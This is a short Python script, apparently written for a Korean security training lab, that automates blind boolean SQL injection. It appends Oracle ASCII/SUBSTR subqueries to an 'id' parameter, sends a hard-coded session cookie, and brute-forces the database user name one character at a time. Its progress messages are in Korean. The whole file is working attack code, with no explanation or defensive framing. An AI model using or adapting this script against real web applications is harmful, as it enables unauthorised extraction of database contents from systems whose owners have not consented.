import requests

url = 'https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and '

cookies = {
    "JSESSIONID":"501E555D7510DA10E38871719F95041A"
}

querybase = '(select ascii(substr(user, {}, 1)) from dual) = {}'
result = ''

for substrpos in range(1, 9):
    for ascii in range(65, 91):
        query = querybase.format(substrpos, ascii)
        queryurl = url + query
        res = requests.get(queryurl, cookies=cookies)

        if 'MacBook' in res.text:
            print('참')
            print(str(substrpos) + '번째 글자는 ' + chr(ascii) + '입니다.')
            result += chr(ascii)
            break
        else:
            print(str(substrpos) + '번째 글자 ascii : ' + str(ascii) + ' 거짓')

print(result)


